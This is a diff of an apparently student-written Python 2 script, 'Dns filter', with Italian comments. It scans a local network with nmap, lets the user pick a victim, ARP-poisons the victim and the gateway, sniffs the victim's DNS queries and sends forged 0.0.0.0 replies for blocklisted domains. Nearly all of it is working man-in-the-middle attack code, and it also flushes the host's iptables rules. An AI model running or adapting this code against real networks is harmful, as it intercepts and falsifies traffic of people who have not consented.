@@ -1,23 +1,20 @@
-#   Dns filter
-#   Author: Federico Germinario 545081
+#  Dns filter
+#  Author: Federico Germinario 545081
 
 #!/usr/bin/python
 
 from subprocess import Popen, PIPE
 from scapy.all import *
-import nmap
-import os
-import threading
-import time
-import argparse
-import sys
-import datetime
-import pyfiglet 
 from Hashtable import Hashtable
+import nmap
+import threading
+import argparse
+import datetime
 
+# Path file di sistema
 log = "log.txt"   
-policy= "policy.txt"
-policy_blackList = "blacklist-hostnames.txt"
+policy = "policy.txt"
+policy_blacklist = "blacklist-hostnames.txt"
 
 def initial_setup():                    
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")   # Abilito l'ip forward
@@ -25,30 +22,36 @@ def initial_setup():
     os.system("iptables --zero")
     os.system("iptables --delete-chain")
     os.system("iptables -F -t nat")
-    os.system("iptables -A FORWARD -p UDP --dport 53 -j REJECT")
+    os.system("iptables -A FORWARD -p UDP --dport 53 -j REJECT") # Regola per bloccare il forward dei pacchetti dns
     
-def write_log(txt):        # Funzione per scivere sul file di log   
+def write_log(txt):     # Funzione per scivere sul file di log   
     f = open("log.txt", "a")
-    log = "[" + str(datetime.datetime.now()) + "]: " + txt + "\n"
+    now = datetime.datetime.now()
+    current_time = now.strftime("%d/%m/%Y, %H:%M:%S")
+    log = "[" + current_time + "]: " + txt + "\n"
     f.write(log)
 
-def read_filter_list():  # Funzione per leggere il file di policy
+def read_policy():      # Funzione per leggere il file di policy
     try:
         f = open(policy, "r")
-        return f.readlines()
+        read = f.readlines()
+        f.close()
+        return read
     except IOError:
         print "[!!!] Could not read file:", policy 
         return None
 
-def read_blacklist():  # Funzione per leggere il file blacklist
+def read_policy_blacklist():  # Funzione per leggere il file policy blacklist
     try:
-        f = open(policy_blackList, "r")
-        return f.readlines()
+        f = open(policy_blacklist, "r")
+        read = f.readlines()
+        f.close()
+        return read
     except IOError:
-        print "[!!!] Could not read file:", policy_blackList 
+        print "[!!!] Could not read file:", policy_blacklist
         return None
 
-def nmap_arp_scan(range):   # Funzione che esegue una scansione ARP Scan con Nmap 
+def arp_scan(range):   # Funzione che esegue una scansione arp con Nmap 
     try:
         nm = nmap.PortScanner()
         nm.scan(hosts=range, arguments='-sP')
@@ -61,18 +64,18 @@ def nmap_arp_scan(range):   # Funzione che esegue una scansione ARP Scan con Nma
             ip[host] = status, mac
         return ip
     except KeyboardInterrupt:
-        print "Stop scan"
-        stop("null", "null", "null", "null")
+        print "[*] Stop network scan"
+        stop_dns_filter(None, None, None, None)
 
-def stop(gateway_ip, target_ip, target_mac, gateway_mac):   # Funzione per fermare l'attacco
+def stop_dns_filter(gateway_ip, target_ip, target_mac, gateway_mac):   # Funzione per fermare l'attacco e ripristanare le tabelle arp
     print "Keyboard Interrupt (CTRL+C)...Closing..."
-    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")     # Disabilito l'ip forword
     os.system("iptables --flush")	
-    if gateway_ip != "null" and target_ip != "null" and target_mac != "null" and gateway_mac != "null":
+    if gateway_ip != None and target_ip != None and target_mac != None and gateway_mac != None:
         restore_target(gateway_ip, target_ip, target_mac, gateway_mac)
     exit()
 
-def selection(ip):              # Funzione per selezionare una vittima dalla scansione effettuata
+def selection(ip):      # Funzione per selezionare una vittima dalla scansione effettuata
     try:
         iplist = []
         i = 0
@@ -82,12 +85,14 @@ def selection(ip):              # Funzione per selezionare una vittima dalla sca
             iplist.append([x, target_mac.split()[0]])
             i+=1
         sel = input("Selection Number: ")
+        if sel >= i:
+            print "[!!!] Target not exist"
+            stop_dns_filter(None, None, None, None)
         target_ip = iplist[sel][0]
         target_mac = iplist[sel][1]
         return target_ip, target_mac
     except KeyboardInterrupt:
-        print "\nStop..."
-        stop("null", "null", "null", "null")
+        stop_dns_filter(None, None, None, None)
 
 def get_gateway_ip():                           # Funzione che restituisce l'ip del gateway
     cmd = Popen(["ip", "route"], stdout=PIPE)
@@ -97,9 +102,9 @@ def get_gateway_ip():                           # Funzione che restituisce l'ip 
 def get_gateway_mac(gateway_ip):     # Funzione che restituisce il mac del gateway
     return srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=gateway_ip), timeout=10)[0][0][1][ARP].hwsrc
 
-def arp_poisoning(gateway_ip, target_ip, gateway_mac, target_mac):       # Thread ARP Spoofing
-    poison_target = ARP()
-    poison_target.op = 2
+def arp_poisoning(gateway_ip, target_ip, gateway_mac, target_mac):       # Thread arp spoofing
+    poison_target = ARP()    # Arp Reply
+    poison_target.op = 2       
     poison_target.psrc = gateway_ip
     poison_target.pdst = target_ip
     poison_target.hwdst = target_mac
@@ -117,62 +122,67 @@ def arp_poisoning(gateway_ip, target_ip, gateway_mac, target_mac):       # Threa
         send(poison_gateway, verbose = False)
         time.sleep(2)
 
-def restore_target(gateway_ip, target_ip, gateway_mac, target_mac):  
+def restore_target(gateway_ip, target_ip, gateway_mac, target_mac):  # Funzione che ripristina le tabelle arp dei dispositivi
     send(ARP(op=2, 
             hwsrc=gateway_mac,   
             psrc= gateway_ip, 
             hwdst= "ff:ff:ff:ff:ff:ff" , 
             pdst= target_ip), 
-        count=5,
-        verbose=0)
+        count=6,
+        verbose = False)
     send(ARP(op=2, 
             hwsrc=target_mac, 
             psrc= target_ip, 
             hwdst= "ff:ff:ff:ff:ff:ff", 
             pdst= target_ip),   
-        count=5,
-        verbose=0)
+        count=6,
+        verbose = False)
+
     print "[*] ARP Table restored to normal!"
 
-def forwording_dns(pkt):                            # Thread forwording pacchetti dns non in blacklist
-    print "Forwarding: " + pkt[DNSQR].qname
-    response = sr1(
+def forwording_dns(pkt):                            # Thread forwording pacchetti dns 
+    print "Forwarding: " + pkt[DNSQR].qname.rstrip('.').replace( "www.", "")
+    response = sr1(                                 # Invia una richiesta dns e aspetta la risposta
         IP(dst='8.8.8.8')/
             UDP(sport=pkt[UDP].sport)/
             DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),
-        verbose=0,
-        timeout=50
+        verbose=False,
+        timeout=2
     )
     if response != None:
-        resp_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport)/DNS()
+        resp_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport)/DNS()  # Incapsulo la risposta dns e la invio
         resp_pkt[DNS] = response[DNS]
-        send(resp_pkt, verbose=0)
-        print "Responding to " + pkt[IP].src + "\n"
+        send(resp_pkt, verbose = False)                     
 
-def sniff_callback(table_filter, table_blacklist):     
-    def forwording(pkt):
+def callback (table_policy, table_policy_blacklist):  # Callback chiamata dalla funzione sniff ogni qual volta ricevo un pacchetto dns dall' ip 
+    def filter(pkt):                                 # che sto sniffando
         dns = pkt['DNS']
-        qname = dns.qd.qname.rstrip('.')
-        if (table_filter == None or table_filter.search(qname + "\n") == None) and (table_blacklist == None or table_blacklist.search(qname + "\n") == None):
+        qname = dns.qd.qname.rstrip('.').replace( "www.", "") # Parsing dominio 
+        if (table_policy == None or table_policy.search(qname + "\n") == None) and \
+            (table_policy_blacklist == None or table_policy_blacklist.search(qname + "\n") == None): # Controllo se la richiesta dns deve essere bloccata
             if (
                 DNS in pkt and
                 pkt[DNS].opcode == 0 and
                 pkt[DNS].ancount == 0
             ):
-                forwording = threading.Thread(target=forwording_dns(pkt), args=[pkt])
-                forwording.start()   
+                forwording = threading.Thread(target=forwording_dns(pkt), args=[pkt]) 
+                forwording.start()                              # Start thread per il forward del pacchetto dns 
         else:
+            # Pacchetto dns bloccato 
+            spf_resp = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=53)/ \
+                        DNS(id=pkt[DNS].id, ancount=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, rdata='0.0.0.0'))     
+            send(spf_resp, verbose=False)                     # Invio alla vittima una risposta dns non valida
             write_log("Request dns " + qname + " dropped!")
             print "Request dns " + qname + " dropped!"
-    return forwording
+    return filter
 
-def sniff_thread(iface, target_ip, table_filter, table_blacklist):              # Thread sniffing pacchetti dns
-    print '[*] Beginning sniffing'
+def sniff_thread(iface, target_ip, table_policy, table_policy_blacklist):              # Thread sniffing pacchetti dns
+    print '[*] Beginning sniffing\n'
     dns_filter = "udp and port 53 and src " + target_ip
-    pkt = sniff(iface=iface, filter = dns_filter, prn=sniff_callback(table_filter, table_blacklist), store=0)  
+    sniff(iface=iface, filter = dns_filter, prn=callback(table_policy, table_policy_blacklist), store=0)
 	
-def parse():
-    parser = argparse.ArgumentParser(description='DNS filtering')
+def parse():  # Funzione parsing parametri di input
+    parser = argparse.ArgumentParser(description='DNS FILTER')
     parser.add_argument('-i', '--interface', help='Network interface to attack on', action='store', dest='interface', default=False)
     parser.add_argument('-r', '--range', help='Local network scan range', action='store', dest='range', default=False)
     args = parser.parse_args()
@@ -187,56 +197,59 @@ def parse():
     	sys.exit(1)
     return args.interface, args.range 
 
-if __name__ == '__main__':
-    try:
-        result = pyfiglet.figlet_format("Dns filter") 
-        print(result) 
-        print "[*] Initial setup"
-        initial_setup()
-        print "[*] Reading file in progress..."
-        filter_list = read_filter_list()
-        blacklist = read_blacklist()
-        if filter_list == None or blacklist == None:
-            exit()
-        if len(filter_list) == 0:
-            table_filter = None
-        else:
-            table_filter = Hashtable(len(filter_list))
-            for line in filter_list:
-                table_filter.insert(line, line)
+def start_dns_filter():
+    iface, range = parse()  
+    print "DNS filter"
+    print "Author: Federico Germinario\n\n"  
+    print "[*] Initial setup"
+    initial_setup()
+    print "[*] Reading file in progress..."
+    policy_list = read_policy()                 
+    policy_blacklist_list = read_policy_blacklist()
+    if policy_list == None or policy_blacklist_list == None:
+        exit()
+    if len(policy_list) == 0:
+        table_policy = None
+    else:
+        table_policy = Hashtable(len(policy_list))
+        for line in policy_list:
+            table_policy.insert(line, line)
         
-        if len(blacklist) == 0:
-            table_blacklist = None
-        else:
-            table_blacklist = Hashtable(len(blacklist))
-            for line in blacklist:
-                table_blacklist.insert(line, line)
-        print "[*] Reading completed!"
-
-        iface, range = parse()                   
-        gateway_ip = get_gateway_ip()
-        gateway_mac = get_gateway_mac(gateway_ip)
-        if gateway_mac == 'Unknown':
-            print '[!!!] Cannot find gateway mac'
-            exit()
-        print '\n[*] Interface: %s' %iface
-        print '[*] Range scan: %s' %range
-        print '[*] Gateway: %s [%s]' %(gateway_ip, gateway_mac)
-        print '\n[*] Network scan in progress ...'
-        scan = nmap_arp_scan(range)               #Scansione arp della rete 
-        target_ip, target_mac = selection(scan) #Seleziono la vittima
-        if target_mac == "Unknown":
-            print "[!!!] Mac not found"
-            exit()
-        print '\n[*] Target: %s [%s]' %(target_ip, target_mac)
-        arp = threading.Thread(target=arp_poisoning, args=[gateway_ip, target_ip, gateway_mac, target_mac])  
-        arp.setDaemon(True)
-        arp.start()                                 #Start l'ARP Spoofing   
-        sniff = threading.Thread(target=sniff_thread(iface, target_ip, table_filter, table_blacklist), args=[iface, target_ip, table_filter, table_blacklist])
-        sniff.setDaemon(True)
-        sniff.start()                               #Start sniffing
+    if len(policy_blacklist_list) == 0:
+        table_policy_blacklist = None
+    else:
+        table_policy_blacklist = Hashtable(len(policy_blacklist_list))
+        for line in policy_blacklist_list:
+            table_policy_blacklist.insert(line, line)
+    print "[*] Reading completed!"
+               
+    gateway_ip = get_gateway_ip()
+    gateway_mac = get_gateway_mac(gateway_ip)
+    if gateway_mac == 'Unknown':
+        print '[!!!] Cannot find gateway mac'
+        stop_dns_filter(None, None, None, None)
+    print '\n[*] Interface: %s' %iface
+    print '[*] Range scan: %s' %range
+    print '[*] Gateway: %s [%s]' %(gateway_ip, gateway_mac)
+    print '\n[*] Network scan in progress...'
+    scan = arp_scan(range)                              # Scansione arp della rete locale 
+    target_ip, target_mac = selection(scan) 
+    if target_mac == "Unknown":
+        print "[!!!] Mac not found"
+        stop_dns_filter(None, None, None, None)
+    print '\n[*] Target: %s [%s]' %(target_ip, target_mac)
+    arp = threading.Thread(target=arp_poisoning, args=[gateway_ip, target_ip, gateway_mac, target_mac])  
+    arp.setDaemon(True)
+    arp.start()                                 # Start thread dell'ARP Spoofing   
+    sniff = threading.Thread(target=sniff_thread, args=[iface,  target_ip, table_policy, table_policy_blacklist])
+    sniff.setDaemon(True)
+    sniff.start()                               # Start thread sniffing pacchetti dns
+    return gateway_ip, target_ip, target_mac, gateway_mac
+   
+if __name__ == "__main__":   
+    gateway_ip, target_ip, target_mac, gateway_mac = start_dns_filter()
+    try:
         while True:
             pass
     except KeyboardInterrupt:
-        print "\nStop..."
-        stop(gateway_ip, target_ip, target_mac, gateway_mac)
+        stop_dns_filter(gateway_ip, target_ip, target_mac, gateway_mac)
